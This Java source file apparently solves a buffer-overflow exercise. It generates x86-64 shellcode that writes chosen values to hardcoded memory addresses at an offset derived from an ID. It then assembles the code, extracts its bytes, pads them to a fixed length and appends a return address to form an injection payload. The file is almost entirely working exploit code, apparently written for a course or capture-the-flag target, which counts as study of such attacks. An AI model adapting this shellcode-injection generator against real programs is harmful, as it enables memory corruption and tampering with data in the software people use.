import java.io.*;

public class Solver {

    private static final int NEEDED_LENGTH = 525;
    //OFFSET = 4 * ID
    private static final String secA = "0x603cc0";
    private static final String secB = "0x602b80";
    private static String[] PRG = {".globl main",
				   "main:",
				   "pop %rbp",
				   "push %rax",
				   "push %rsi",
				   "push %rdi",
				   "mov $0x64, %rdi",
				   "mov $11, %rbx",
				   "sub $1, %rbx",
				   "mov $%SECTION, %rsi",
				   "mov $0, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %rbx, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "mov %edi, %OFFSET(%rsi,%rax,4)",
				   "add $100, %rax",
				   "pop %rdi",
				   "pop %rsi",
				   "pop %rax",
				   "mov $0x400969, %rbx",
				   "jmp *%rbx",};
    
    public static void main(String[]args) throws Exception {
	if(args.length != 2) {
	    System.out.println("Use java Solver <section> <ID>");
	    System.exit(69);
	}
	String section = args[0].equalsIgnoreCase("A") ? secA : secB;
	int ID = Integer.parseInt(args[1]);

	BufferedWriter bw = new BufferedWriter(new FileWriter(new File("hack.s")));
	for(String line : PRG) {
	    String t = line.replaceAll("%SECTION", section).replaceAll("%OFFSET", ""+ID*4);
	    System.out.println(t);
	    bw.write(t);
	    bw.write("\n");
	}
	bw.close();
	Process p = Runtime.getRuntime().exec("make hack");
	p.waitFor();
	DataInputStream dis = new DataInputStream(new FileInputStream(new File("hack.o")));

	int start = 0x40;
	int len = 220;
	int curByte = 0;
	int readByte = 0;
	String bytes = "";
	try {
	    while (true) {
		readByte = dis.readByte();
		if(curByte >= start && curByte <= start+len) {
		    if(readByte == 0x2e) break;
		    String s = String.format("%02x", readByte&0xff);
		    bytes+=s;
		    //System.out.printf("%02x", (readByte&0xff));
		}
		curByte++;
	    }
	} catch(Exception e){}
	System.out.println(bytes);
	bw = new BufferedWriter(new FileWriter(new File("test.txt")));
	if(section == secA) bw.write("C A\n");
	else bw.write("C B\n");
	bw.write("X " + bytes + "\nX ");
	for(int i = 0; i < NEEDED_LENGTH-bytes.length(); i++) {
	    bw.write(i%2==0 ? "6" : "9");
	}
	bw.write("\nX 0120600\n");
	bw.close();
    }
}
